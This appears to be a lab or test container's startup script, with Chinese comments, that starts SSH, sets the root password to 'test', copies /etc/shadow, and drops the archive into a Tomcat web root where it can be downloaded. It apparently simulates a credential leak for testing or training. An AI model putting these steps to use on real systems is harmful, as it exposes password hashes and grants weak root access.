#!/bin/sh
#测试ssh
apt install openssh-server
/etc/init.d/ssh start
#修改账号密码
echo root:test | chpasswd
#敏感操作
cat /etc/shadow > /tmp/shadow.txt
tar -cvf /tmp/shadow.tar /tmp/shadow.txt
cp /tmp/shadow.tar /usr/local/apache-tomcat-8.5.31/webapps/ROOT/
exec "$@"